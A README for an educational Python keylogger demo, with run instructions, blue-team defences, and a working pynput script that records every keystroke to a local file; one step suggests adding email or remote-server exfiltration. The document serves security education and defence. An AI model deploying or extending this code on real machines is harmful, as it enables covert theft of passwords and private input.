Keylogger Attack Demo (Python)
==============================

📌 Overview
-----------
This project is a simple Python-based keylogger created for ethical hacking demonstrations, red team simulations, and cybersecurity education. It captures keyboard inputs and saves them to a log file for analysis.

⚠️ Legal Disclaimer: This project is intended for educational purposes only. Unauthorized access or use of keyloggers is illegal and unethical.

🎯 Objective
------------
- Demonstrate how keyloggers can be used in attacks.
- Understand how attackers deploy keyloggers.
- Learn how to defend against keylogging threats.

🔧 Requirements
---------------
- Python 3.x
- pynput library (pip install pynput)

🧪 How to Run (Attack Demo)
---------------------------
⚠️ For Local Testing / Red Team Demo Only!

1. Clone the repository
   git clone https://github.com/yourusername/keylogger-attack-demo.git
   cd keylogger-attack-demo

2. Install dependencies
   pip install pynput

3. Run the keylogger
   python keylogger.py

4. Observe output
   - Keystrokes are saved in a file named 'key_log.txt'.

5. (Optional) Modify script to send logs via email or remote server (educational purposes only).

🔒 Defense Strategy (Blue Team)
------------------------------
✅ 1. Detect Keyloggers
- Use antivirus software or endpoint detection and response (EDR) tools.
- Check for suspicious Python processes running in Task Manager.
- Monitor abnormal file changes or logging behavior.

✅ 2. Prevent Keylogger Installation
- Keep OS and software updated.
- Avoid downloading scripts or files from untrusted sources.
- Restrict user permissions and enforce application whitelisting.

✅ 3. Block Keylogger Execution
- Use firewalls or group policies to block unknown scripts.
- Disable script execution from temp folders.

✅ 4. Respond to an Infection
- Quarantine and remove malicious scripts.
- Rotate passwords immediately.
- Check systems for data exfiltration (e.g., FTP, SMTP traffic).

👨‍💻 Example Code (keylogger.py)
-------------------------------
from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()

🧠 Learning Outcomes
--------------------
- Understand how a basic keylogger works.
- Recognize potential entry points attackers might exploit.
- Build defenses against keylogging-based threats.
